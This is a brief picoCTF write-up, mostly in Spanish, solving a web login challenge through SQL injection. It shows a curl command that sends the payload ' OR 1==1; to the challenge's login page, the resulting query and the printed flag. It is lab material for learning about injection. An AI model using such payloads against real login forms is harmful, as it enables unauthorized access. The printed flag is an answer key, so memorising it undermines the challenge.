## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
Podemos observar que la página web realiza una verificación de una consulta SQL construida a manera de concatenación, por ejemplo si nosotros ingresamos
Usernam: Miguel
Password: Holamundo
El resultado de la ejecución concatenada sería
```sql
SELECT * FROM users WHERE name='Miguel' AND password='Holamundo'
```

Es aquí donde nos damos cuenta que cada consulta se construye a través de una página SQL, entonces, si nosotros ingresamos en la contraseña o el usuario un campo personalizado, por ejemplo ' OR '1 == 1; nosotros le indicamos a la consulta SQL que cualquier coincidencia es correcta, lo que automáticamente nos da acceso a el sitio.


```powershell
C:\Users\Miguel García>curl -s http://jupiter.challenges.picoctf.org:39720/login.php -d "username=admin&password=' OR 1==1;&debug=1"
<pre>username: admin
password: ' OR 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>
C:\Users\Miguel García>
```

## Bandera
picoCTF{s0m3_SQL_c218b685}
## Notas

## Referencias
https://en.wikipedia.org/wiki/SQL_injection